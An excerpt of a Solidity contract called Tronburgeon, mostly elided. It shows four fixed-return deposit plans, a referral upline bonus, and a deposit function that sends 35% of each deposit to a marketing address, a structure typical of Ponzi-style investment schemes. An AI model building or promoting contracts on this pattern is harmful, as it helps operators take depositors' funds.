...
contract Tronburgeon {
    ...
    constructor(address payable _marketing) public {
        ...
        plans.push(Plan(50, 225, 1e8));
        plans.push(Plan(40, 220, 1e9));
        plans.push(Plan(26, 169, 1e10));
        plans.push(Plan(18, 225, 1e11));
    ...
    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0)) {
            if(players[_upline].deposits.length == 0) {
                ...
                players[_addr].direct_bonus += _amount / 1000;
                direct_bonus += _amount / 1000;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 1000);
    ...
    function deposit(uint8 _plan, address _upline) external payable {
        ...
        require(msg.value >= plans[_plan].min_deposit , "Min deposit require");
		...
		marketing.transfer(msg.value.mul(35).div(100));
